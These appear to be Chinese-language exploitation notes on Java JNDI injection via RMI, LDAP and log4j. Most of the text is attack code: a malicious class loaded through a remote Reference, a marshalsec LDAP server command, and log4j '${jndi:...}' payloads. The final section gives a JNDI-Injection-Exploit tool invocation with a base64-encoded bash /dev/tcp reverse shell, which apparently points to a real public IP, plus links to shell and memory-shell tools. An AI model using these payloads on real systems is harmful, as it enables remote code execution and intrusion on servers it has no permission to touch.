![](.topwrite/assets/image_1727319060611.png)
## **JNDI+RMI利用方式**
直接JNDI运行远程方法。
在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象(当前名称目录系统之外的对象)。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引l用，并且在目录中保存。
当客户端在lookup()查找这个远程对象时，客户端会获又相应的object factory，最终通过factory类将reference转换为具体的对象实例。
在jdk 8U121后不可用了。RMl远程Reference代码默认不信任，RMl远程Reference代码攻击方式开始失效。

**简单案例**
恶意类，编译.class放在8080http服务
```
import java.io.IOException;​
public class Evil {​
        static {​
                try {​
                        Runtime.getRuntime().exec("calc");​
                } catch (IOException e) {​
                        throw new RuntimeException(e);​
                }​
        }​
}
```
RMI服务端，使用Reference引用http上的class文件
```
public class Refer {​
        public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {​
                String url = "http://127.0.0.1:8080/";​
                Registry registry = LocateRegistry.createRegistry(1099);​
                System.out.println("Registry start");​
                Reference reference = new Reference("test", "Evil", url);​
                ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);​
                registry.bind("aa",referenceWrapper);​
        }​
}
```
被攻击的客户端使用JNDI
```
public class Client {​
        public static void main(String[] args) throws NamingException {​
                Context context=new InitialContext();​
                String url="rmi://127.0.0.1:1099/aa";​
                context.lookup(url);​
        }​
}
```


^
## **JNDI+LDAP利用方式**
使用marshalsec启动一个恶意的LDAP服务，可以执行恶意方法。
其中 http://127.0.0.1:8000/#Evil 的根目录下有一个Evil.class的恶意类。
```
java -cp marshalsec-0.0.3-SNAPSH0T-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Evil 10997
```
```
public static void main(String[] args) throws NamingException {
    InitialContext context = new InitialContext();
    context.lookup( "ldap://127.0.0.1:10997/evil");
}
```
从jdk 8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。

^
## **存在JNDI注入的入口类方法**
即存在new InitialContext().lookup()
常见有类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法中。




^
## **log4j的JNDI注入**
```
使用${jndi:}后，底层使用了new InitialContext().lookup()
logger.info("${jndi:ldap://127.0.0.1:1099/Evil}");
logger.error("${jndi:ldap://127.0.0.1:1099/Evil}");
```

```
仅测试dnslog即可，一般有结果就一定存在注入
logger.info("${jndi:ldap://xx.dnslog.cn}");
```

^
## **一键搭建LDAP或RMI利用服务**

JNDI利用工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
jndi进行命令执行，反弹shell：<https://blog.csdn.net/m0_74294234/article/details/137188160>
支持同时启动ldap服务和rmi服务。

```
java8 -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc"

${jndi:rmi://192.168.1.8:1099/yfwrr7}
${jndi:ldap://192.168.1.8:2113/akndj}


注意反弹shell命令需要base64编码
bash -i >& /dev/tcp/（你服务器的公网IP地址）/8888（监听的端口号，我这里使用的是8888端口） 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzYuMjMxLjczLzg4ODggMD4mMQ==（这是上一行代码的base64编码）

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNzYuMjMxLjczLzg4ODggMD4mMQ==}|{base64,-d}|{bash,-i}" -A "（你服务器的公网IP地址）"
```


^
可以注入内存马的最新版工具：
<https://github.com/wyzxxz/jndi_tool>